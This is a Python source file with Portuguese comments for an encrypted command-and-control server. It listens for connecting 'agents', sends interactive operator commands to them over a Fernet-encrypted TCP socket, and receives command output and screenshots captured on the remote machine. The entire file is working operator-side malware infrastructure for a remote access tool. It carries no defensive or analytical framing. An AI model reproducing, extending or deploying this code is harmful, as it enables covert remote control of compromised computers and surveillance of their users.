import socket
import logging
import time
import sys
import os
from typing import Tuple, Optional

# Ajuste de path para permitir a importação do pacote utilitário comum
sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), '..')))
from utils.crypto import CryptoHelper

# Configuração de logging profissional
logging.basicConfig(level=logging.INFO, format='%(asctime)s - [%(levelname)s] - %(message)s')

# Coleta a chave da variável de ambiente do Sistema Operacional
CHAVE_AMBIENTE = os.getenv("C2_SECRET_KEY")

if not CHAVE_AMBIENTE:
    print("\n[-] Erro Crítico: A variável de ambiente C2_SECRET_KEY não foi definida.")
    print("[*] Configure a chave no seu terminal antes de iniciar o servidor.")
    print("[*] Exemplo (PowerShell): $env:C2_SECRET_KEY=\"SUA_CHAVE_FERNET=\"")
    sys.exit(1)

# Converte a string da variável para o formato de bytes exigido pelo Fernet
CHAVE_SEC_PADRAO = CHAVE_AMBIENTE.encode("utf-8")

class CommandAndControlServer:
    """
    Abstração de Engenharia para o Servidor de Comando e Controle (Listener TCP Cifrado).
    """
    def __init__(self, host: str, port: int, buffer_size: int = 4096) -> None:
        self.host: str = host
        self.port: int = port
        self.buffer_size: int = buffer_size
        self._server_socket: Optional[socket.socket] = None
        # Inicializa o helper de criptografia com a chave dinâmica
        self.crypto = CryptoHelper(CHAVE_SEC_PADRAO)

    def start(self) -> None:
        """Inicializa o socket de escuta cifrado na porta especificada."""
        try:
            self._server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self._server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self._server_socket.bind((self.host, self.port))
            self._server_socket.listen(5)
            logging.info(f"Servidor C2 Cifrado iniciado com sucesso em {self.host}:{self.port}")
            
            self._await_connections()
        except socket.error as e:
            logging.error(f"Falha crítica ao iniciar o socket do servidor: {e}")
        except KeyboardInterrupt:
            logging.info("\nSinal de interrupção recebido. Desligando C2...")
        finally:
            self._cleanup()

    def _await_connections(self) -> None:
        """Coloca o servidor em estado de aguardo por conexões criptografadas de agentes."""
        if not self._server_socket:
            return

        logging.info("Aguardando conexões de agentes ativos (Secure Beacons)...")
        client_socket, client_address = self._server_socket.accept()
        self._establish_session(client_socket, client_address)

    def _establish_session(self, client_socket: socket.socket, address: Tuple[str, int]) -> None:
        """Gerencia a sessão interativa cifrada com o agente conectado."""
        logging.info(f"Conexão estabelecida de forma segura com o agente: {address[0]}:{address[1]}")
        
        with client_socket:
            while True:
                try:
                    command: str = input(f"c2_secure@{address[0]}:$ ").strip()
                    if not command:
                        continue
                    
                    # Cifra a string de comando antes de despachar para a rede
                    command_cifrado = self.crypto.encrypt_data(command.encode("utf-8"))
                    client_socket.sendall(command_cifrado)
                    
                    if command.lower() == "exit":
                        logging.info("Comando de encerramento enviado. Fechando sessão.")
                        break
                        
                    elif command.lower() == "screenshot":
                        logging.info("Solicitando captura de tela. Aguardando tamanho cifrado do payload...")
                        
                        # Recebe o cabeçalho descritor inicial
                        header_data = client_socket.recv(self.buffer_size)
                        if not header_data:
                            break
                        
                        # Decifra o cabeçalho para ler o tamanho real em bytes que virá a seguir
                        header_decifrado = self.crypto.decrypt_data(header_data).decode("utf-8").strip()
                        if header_decifrado.startswith("[-]"):
                            logging.error(f"Erro retornado pelo agente: {header_decifrado}")
                            continue
                            
                        file_size = int(header_decifrado)
                        logging.info(f"Recebendo payload binário cifrado ({file_size} bytes)...")
                        
                        # Consome os blocos criptografados da imagem da rede
                        dados_cifrados = b""
                        while len(dados_cifrados) < file_size:
                            chunk = client_socket.recv(self.buffer_size)
                            if not chunk:
                                break
                            dados_cifrados += chunk
                        
                        # Realiza a decifragem da imagem integral diretamente na memória RAM
                        imagem_clara = self.crypto.decrypt_data(dados_cifrados)
                        
                        filename = f"screenshot_cifrada_{int(time.time())}.png"
                        with open(filename, "wb") as f:
                            f.write(imagem_clara)
                        print(f"[+] Sucesso! Imagem recebida cifrada e salva localmente como: {filename}")
                    
                    else:
                        # Retorno padrão para comandos de texto do terminal
                        resposta_cifrada = client_socket.recv(self.buffer_size)
                        if not resposta_cifrada:
                            logging.warning("Conexão fechada abruptamente pelo agente.")
                            break
                            
                        # Decifra os bytes de texto antes de imprimi-los na tela do operador
                        resposta_clara = self.crypto.decrypt_data(resposta_cifrada).decode("utf-8")
                        print(resposta_clara)
                    
                except socket.error as e:
                    logging.error(f"Erro na transmissão de dados da sessão: {e}")
                    break

    def _cleanup(self) -> None:
        """Garante a liberação limpa de todos os recursos de rede alocados."""
        if self._server_socket:
            self._server_socket.close()
            logging.info("Socket do servidor C2 fechado com segurança.")